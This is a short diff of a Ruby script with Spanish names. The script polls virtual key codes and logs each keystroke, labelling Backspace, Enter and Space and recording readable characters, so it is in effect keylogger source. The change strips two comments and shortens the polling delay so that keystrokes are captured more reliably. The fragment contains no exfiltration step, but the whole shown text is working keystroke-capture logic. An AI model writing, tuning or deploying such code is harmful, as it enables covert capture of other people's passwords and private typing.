@@ -50,7 +50,7 @@ loop do
       when 8  then registrar(" [BORRAR] ")
       when 13 then registrar(" [ENTER] ")
       when 32 then registrar(" [ESPACIO] ")
-      when 160, 161 then next # Shift
+      when 160, 161 then next 
       else
         # Intentar capturar caracteres legibles
         caracter = vkey.chr rescue nil
@@ -58,7 +58,7 @@ loop do
           registrar("Tecla: #{caracter}")
         end
       end
-      sleep 0.12 # Evitar rebote de teclas
+      sleep 0.05 
     end
   end
   sleep 0.01 
